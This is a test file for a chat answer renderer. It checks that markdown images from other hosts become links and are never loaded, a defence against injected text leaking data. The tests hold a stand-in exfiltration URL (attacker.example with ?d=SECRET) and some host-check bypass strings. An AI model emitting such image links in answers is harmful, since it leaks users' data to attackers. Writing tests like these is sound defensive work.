import { render } from "@testing-library/react";
import { MessageResponse } from "./message-response";
import { isSameOriginImageSrc } from "./message-markdown";

/**
 * Markdown images in an answer (security audit 2026-10-23): a same-origin
 * image draws; any other source becomes a link and is never fetched, so text
 * steered by a ticket or a web page cannot send data off-site by itself.
 */

describe("MessageResponse images", () => {
  it("draws an image from this site", async () => {
    const { container, findByRole } = render(<MessageResponse>{"![Form 4](/tool-images/form-4.webp)"}</MessageResponse>);
    await findByRole("img");
    expect(container.querySelector("img")?.getAttribute("src")).toBe("/tool-images/form-4.webp");
  });

  it("turns an image from another host into a link and loads nothing", async () => {
    const { container, findByRole } = render(
      <MessageResponse>{"![pixel](https://attacker.example/p.png?d=SECRET)"}</MessageResponse>
    );
    const link = await findByRole("link");
    expect(link.getAttribute("href")).toBe("https://attacker.example/p.png?d=SECRET");
    expect(container.querySelector("img")).toBeNull();
  });

  it("treats protocol-relative and backslash paths as other hosts", () => {
    expect(isSameOriginImageSrc("/a.png")).toBe(true);
    for (const src of ["//attacker.example/p.png", "/\\attacker.example/p.png", "https://x.example/p.png", "data:image/png;base64,AA", undefined]) {
      expect(isSameOriginImageSrc(src)).toBe(false);
    }
  });
});
